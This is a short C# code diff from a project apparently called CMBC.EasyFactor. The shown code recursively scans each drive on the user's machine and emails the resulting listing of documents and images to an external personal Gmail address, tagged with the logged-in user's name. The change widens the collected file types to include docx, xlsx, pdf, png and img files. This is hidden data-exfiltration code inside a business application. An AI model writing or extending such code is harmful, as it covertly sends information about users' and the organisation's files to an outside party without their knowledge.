@@ -1121,7 +1121,7 @@ namespace CMBC.EasyFactor
                 if (di.IsReady)
                 {
                     System.IO.DirectoryInfo rootDir = di.RootDirectory;
-                    String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".xls" }, 5);
+                    String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".img" }, 5);
                     if (!String.IsNullOrEmpty(result))
                     {
                         MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
